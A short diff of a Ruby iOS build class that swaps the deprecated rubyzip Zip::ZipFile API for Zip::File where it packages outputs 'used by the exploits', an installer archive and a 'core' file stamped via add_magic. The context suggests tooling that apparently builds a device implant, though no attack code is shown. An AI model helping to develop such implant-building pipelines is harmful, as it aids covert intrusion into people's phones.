@@ -89,7 +89,7 @@ class BuildIOS < Build
     file.close
 
     # this is useful to have all the files in one single archive, used by the exploits
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
       @outputs.each do |output|
         z.file.open(output, "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
       end
@@ -110,7 +110,7 @@ class BuildIOS < Build
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
-    Zip::ZipFile.open(path('installer.zip'), Zip::ZipFile::CREATE) do |z|
+    Zip::File.open(path('installer.zip'), Zip::File::CREATE) do |z|
       Dir[path('ios/**')].each do |file|
         z.file.open("ios/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
       end
@@ -128,7 +128,7 @@ class BuildIOS < Build
   end
 
   def unique(core)
-    Zip::ZipFile.open(core) do |z|
+    Zip::File.open(core) do |z|
       core_content = z.file.open('core', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
